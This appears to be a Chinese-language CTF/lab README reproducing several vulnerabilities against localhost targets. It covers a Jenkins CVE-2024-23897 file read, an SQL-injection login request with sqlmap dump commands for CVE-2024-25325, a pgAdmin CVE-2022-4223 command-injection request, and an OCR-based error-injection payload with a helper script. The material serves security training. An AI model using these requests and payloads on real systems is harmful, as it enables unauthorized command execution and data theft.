- [windows-386](https://github.com/wjlin0/CVE-2024-23897/releases/download/v1.0.2/CVE-2024-23897_1.0.2_windows_386.zip)

```shell
CVE-2024-23897 -u http://localhost:9002/
```

![image-20240413122058087](./img/README/image-20240413122058087.png)

读取`/flag` 文件

```sh
CVE-2024-23897 -u http://localhost:9002 -c connect-node -a /flag
```



![image-20240413122219414](./img/README/image-20240413122219414.png)

### CVE-2024-25325

> CVE-2024-25325 登陆处存在sql注入

将以下请求保存至`flag.txt`

```text
POST /Admin/login.php HTTP/1.1
Host: localhost:9001
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close

txtusername=admin&txtpassword=1*&btnlogin=
```

利用`sqlmap`使用

```sh
sqlmap -r Desktop/flag.txt
```

![image-20240413123221732](./img/README/image-20240413123221732.png)

```sh
sqlmap -r Desktop/flag.txt --technique B -D employee_akpoly -T flag -C flag --dump
```

![image-20240413125347827](./img/README/image-20240413125347827.png)


### CVE-2022-4223

> 

在复现漏洞前，需要发送如下数据包获取CSRF token：

```
GET /login HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
Connection: close
```



在返回包中拿到一个新的session id和csrf token：

![1](./img/README/1.png)

然后，将获取到的`session_id`和`csrf_token`填写进下面的数据包并发送：

```
POST /misc/validate_binary_path HTTP/1.1
Host: {{Hostname}}
Content-Length: 27
X-pgA-CSRFToken: {{csrf-token}}
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
Cookie: pga4_session={{session-id}}
Connection: close

{"utility_path":"a\";id;#"}
```



可见，`id`命令已经被成功执行：

![2](./img/README/2.png)

## 2025数字中国数安赛道-01EasyWeb

```python
"""文字转图片模块。

提供基础的文字转图片功能和自定义样式支持。
"""
import io
import json
from pathlib import Path
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import os
import requests


def upload_image(payload, upload_url: str) -> bool:
    """上传图片到指定服务器。

    Args:
        image_path: 图片文件路径
        upload_url: 上传服务器URL

    Returns:
        bool: 是否上传成功
    """
    try:

        files = {
            'file': ('test.png', create_image_with_text(payload), 'image/png')
        }
        response = requests.post(upload_url, files=files)
        return json.loads(response.text)
    except Exception as e:
        print(f"图片上传出错：{e}")
        return False


def create_image_with_text(text="A"):
    # 创建一个白色背景的图片，根据文字长度调整宽度
    width = max(400, len(text) * 40)  # 增加宽度
    height = 120  # 增加高度
    img = Image.new('RGB', (width, height), color='white')
    draw = ImageDraw.Draw(img)

    # 使用更清晰的字体
    try:
        font = ImageFont.truetype("Arial.ttf", 48)  # 使用系统字体，增大字号
    except:
        font = ImageFont.load_default()

    # 计算文字位置使其居中
    text_bbox = draw.textbbox((0, 0), text, font=font)
    text_width = text_bbox[2] - text_bbox[0]
    text_height = text_bbox[3] - text_bbox[1]
    x = (width - text_width) // 2
    y = (height - text_height) // 2

    # 绘制黑色文字，增加抗锯齿
    draw.text((x, y), text, fill='black', font=font, stroke_width=1)

    # 将图片转换为字节流
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG', dpi=(300, 300))  # 提高DPI
    img_byte_arr = img_byte_arr.getvalue()

    # 保存测试图片
    open('test.png', 'wb').write(img_byte_arr)

    return img_byte_arr


def main():
    while True:
        payload = input("请输入要上传的图片内容：")
        # 上传图片到服务器
        upload_url = "http://127.0.0.1:8000/ocr"
        print(upload_image(payload, upload_url))



if __name__ == "__main__":
    main()

```

使用报错注入OCR
```sh
# 1123' and (extractvalue(' ~ ', concat(' ~ ' , (select group_concat( flag ) from ocr_db.flag ) ) ) ) ) #

python3 main.py
```